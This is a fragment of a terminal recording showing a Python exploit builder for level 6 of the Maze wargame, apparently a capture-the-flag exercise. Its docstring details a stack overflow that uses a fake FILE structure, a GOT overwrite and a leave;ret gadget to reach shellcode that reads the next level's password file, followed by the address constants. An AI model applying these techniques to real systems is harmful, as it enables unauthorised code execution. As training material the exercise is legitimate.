[99.271417, "o", "\u001b[1;1H\u001b[34m#!/usr/bin/env python3\u001b[m\r\r\n\u001b[31m\"\"\"Maze L6 exploit builder v5.\u001b[m\u001b[2;31H\u001b[K\u001b[3;1H\u001b[31mStack layout (measured with the raw ~519-byte payload, gdb --args):\u001b[m\u001b[3;68H\u001b[K\u001b[4;1H\u001b[31m    buf         = ebp - 0x104          (strcpy target, 0x100 bytes)\r\r\n    buf+0x100   = FILE* f              (overwrite -> fake FILE at buf+0x220)\r\r\n    buf+0x104   = saved ebx (0x0804b11c)\r\r\n    buf+0x108   = saved eip            (dead: main ends with exit(0))\r\r\n    buf+0x10c   = argc (3)             -- caller frame, OVERFLOW-REACHABLE\r\r\n    buf+0x110   = argv pointer         -- repair -> buf+0x1d0\r\r\n    buf+0x114   = envp pointer         -- repair -> buf+0x1dc (argv NULL slot)\r\r\n    buf+0x1d0   = argv[0..2] + NULL    -- INSIDE the overflow, repair pointers\r\r\n    buf+0x220   = fake FILE (copy of the real heap FILE, redirected write pointers)\r\r\n    buf+0x2c0   = shellcode (open/read/write /etc/maze_pass/maze7 -> fd 1)\r\r\nbuf[0..4] = leave;ret (libc+0x1af32e): the fprintf line \"path : buf\" starts at\r\r\nexit@GOT-24, so buf[0..4] lands exactly on exit@GOT. After fprintf, `call\r\r\nexit@plt -> jmp *GOT` runs leave;ret: esp := ebp, pop ebp, ret -> eip =\r\r\n[buf+0x108] = shellcode.\r\r\nRaw payload may contain NULs (they ride in argv[2] as 0x2a bytes and memfrob\r\r\nrestores them after the full-length strlen); argv[2] itself must be NUL-free,\r\r\nso the raw payload must not contain 0x2a.\r\r\n\"\"\"\u001b[m\r\r\n\u001b[35mimport\u001b[m struct, sys\r\r\nLIBC = \u001b[31m0xF7D6D000\u001b[m\r\r\nGADGET_LEAVE_RET = LIBC + \u001b[31m0x1AF32E\u001b[m\u001b[10C\u001b[34m# leave; ret\u001b[m\r\r\nSAVED_EBX\u001b[8C= \u001b[31m0x0804B11C\u001b[m\r\r\nEXIT_GOT = \u001b[31m0x0804B228\u001b[m\r\r\nFAKE_OFF = \u001b[31m0x1E0\u001b[m\u001b[28C\u001b[34m# fake FILE inside buf (right after argv[])\u001b[m\r\r\nPATH_OFF = \u001b[31m0x284\u001b[m\u001b[28C\u001b[34m# path string copy inside buf (NUL-terminated)\u001b[m\r\r\nSC_OFF   = \u001b[31m0x2A0\u001b[m\u001b[28C\u001b[34m# shellcode inside buf (after the path copy)\u001b[m\r\r\nARGV_OFF = \u001b[31m0x1D0\u001b[m\u001b[28C\u001b[34m# argv[0..2] + NULL\u001b[m\r\r\nSTR_A0   = \u001b[31m0x318\u001b[m\u001b[28C\u001b[34m# \"/run/screen/l6/m6\" (rel. buf)\u001b[m\r\r\nSTR_A1   = \u001b[31m0x32A\u001b[m\u001b[28C"]
[99.290143, "o", "\u001b[34m# path            (rel. buf)\u001b[m\r\r\nSTR_A2   = \u001b[31m0x340\u001b[m\u001b[28C\u001b[34m# payload text    (rel. buf)\u001b[m\u001b[34;83H1,1\u001b[11CTop\u001b[1;1H\u001b[?25h\u001b[?4m"]
